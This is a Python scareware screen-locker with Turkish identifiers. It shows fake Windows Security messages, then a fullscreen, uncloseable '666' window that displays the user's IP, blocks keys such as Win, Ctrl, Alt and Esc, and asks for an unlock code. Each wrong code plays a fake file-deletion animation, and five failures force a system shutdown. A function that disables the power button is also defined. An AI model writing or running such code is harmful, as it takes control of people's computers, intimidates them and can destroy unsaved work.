
import keyboard
import os
os.environ['TCL_LIBRARY'] = r'C:\Users\erkan\AppData\Local\Programs\Python\Python313\tcl\tcl8.6'

import tkinter as tk
from tkinter import simpledialog, messagebox
import threading
import time
import random
import socket
from datetime import datetime

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "IP alınamadı"

def masaustu_dosyalar():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    try:
        dosyalar = os.listdir(desktop_path)
        dosyalar = [d for d in dosyalar if len(d) < 40]
        if not dosyalar:
            dosyalar = ["dosya_yok.txt"]
        return dosyalar
    except:
        return ["Erişim_Reddedildi"]

def show_windows_messages():
    root_msg = tk.Tk()
    root_msg.withdraw()
    messagebox.showinfo("Windows Güvenliği", "Windows bilgisayarınızı korudu,\nrahatsızlıktan dolayı özür dileriz.")
    messagebox.showinfo("Windows Güvenliği", "Acaba korudu mu?")
    root_msg.destroy()

def virus_windows():
    show_666_screen()


def show_666_screen():
    global root_666
    root_666 = tk.Tk()
    root_666.attributes('-fullscreen', True)
    root_666.configure(bg='black')
    root_666.attributes("-topmost", True)
    root_666.config(cursor="none")
    root_666.protocol("WM_DELETE_WINDOW", lambda: None)

   
    # Kalan haklar labeli
    global hak_label
    hak_label = tk.Label(root_666, text="", fg="yellow", bg="black", font=("Courier", 30, "bold"))
    hak_label.place(relx=0.01, rely=0.01, anchor="nw")

    # Dosya silme animasyon labeli
    global dosya_etiket
    dosya_etiket = tk.Label(root_666, text="", fg="white", bg="black", font=("Courier", 25))
    dosya_etiket.place(relx=0.5, rely=0.85, anchor="center")

    # IP ve saat etiketi
    global ip_etiket
    ip_etiket = tk.Label(root_666, text="", fg="white", bg="black", font=("Courier", 20))
    ip_etiket.place(relx=0.99, rely=0.01, anchor="ne")

    # Şifre kontrol döngüsü burada
    global hak
    hak = 5

    def ip_ve_saat_guncelle():
        while True:
            ip = get_ip()
            simdi = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            ip_etiket.config(text=f"IP: {ip} | Time: {simdi}")
            time.sleep(1)

    threading.Thread(target=ip_ve_saat_guncelle, daemon=True).start()

    def dosya_sil_animasyonu():
        dosyalar = masaustu_dosyalar()
        if dosyalar and dosyalar[0] != "Information Corrupted":
            dosya = random.choice(dosyalar)
            for i in range(len(dosya)+1):
                dosya_etiket.config(text=dosya[:len(dosya)-i])
                root_666.update()
                time.sleep(0.05)
        else:
            dosya_etiket.config(text="Information Corrupted")

    def sifre_kontrol():
        global hak
        hak_label.config(text=f" {hak}")
        cevap = simpledialog.askstring("666", f"CODE:", show='*', parent=root_666)
        if cevap == "555" or cevap == "tospik31":
            root_666.destroy()
        else:
            hak -= 1
            dosya_sil_animasyonu()
            if hak <= 0:
                root_666.destroy()
                os.system("shutdown /s /t 5")
            else:
                sifre_kontrol()

    # Şifre penceresi hep ön planda olsun
    root_666.after(500, sifre_kontrol)

    root_666.mainloop()

keyboard.block_key("f4")

keyboard.block_key("win")

keyboard.block_key("delete")

keyboard.block_key("ctrl")

keyboard.block_key("alt")

keyboard.block_key("esc")

keyboard.block_key("r")



def disable_power_button():
    os.system('powercfg -setacvalueindex SCHEME_CURRENT SUB_BUTTONS POWERBUTTONACTION 0')
    os.system('powercfg -setdcvalueindex SCHEME_CURRENT SUB_BUTTONS POWERBUTTONACTION 0')
    os.system('powercfg -SetActive SCHEME_CURRENT')


if __name__ == "__main__":
    show_windows_messages()
    virus_windows()

